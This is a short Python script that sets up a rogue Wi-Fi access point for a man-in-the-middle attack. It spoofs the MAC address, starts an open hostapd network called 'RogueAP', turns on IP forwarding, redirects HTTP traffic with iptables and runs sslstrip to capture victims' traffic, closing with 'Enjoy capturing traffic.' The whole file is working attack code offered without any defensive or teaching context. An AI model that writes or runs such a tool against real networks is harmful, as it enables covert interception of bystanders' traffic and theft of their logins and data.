import subprocess

# Set the wireless interface to monitor mode
subprocess.run(["ip", "link", "set", "wlan0", "down"])
subprocess.run(["iw", "wlan0", "set", "monitor", "none"])
subprocess.run(["ip", "link", "set", "wlan0", "up"])

# Change MAC address
subprocess.run(["ip", "link", "set", "wlan0", "down"])
subprocess.run(["macchanger", "-r", "wlan0"])
subprocess.run(["ip", "link", "set", "wlan0", "up"])

# Configure hostapd for creating the rogue AP
hostapd_conf = '''
interface=wlan0
driver=nl80211
ssid=RogueAP
channel=6
'''
with open("/etc/hostapd/hostapd.conf", "w") as f:
    f.write(hostapd_conf)

# Start the rogue AP
subprocess.Popen(["hostapd", "/etc/hostapd/hostapd.conf"])

# Enable IP forwarding
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

# Set up iptables for traffic redirection
subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])

# Start sslstrip to capture HTTP traffic
subprocess.Popen(["sslstrip", "-l", "8080"])

print("Rogue AP created successfully! Enjoy capturing traffic.")
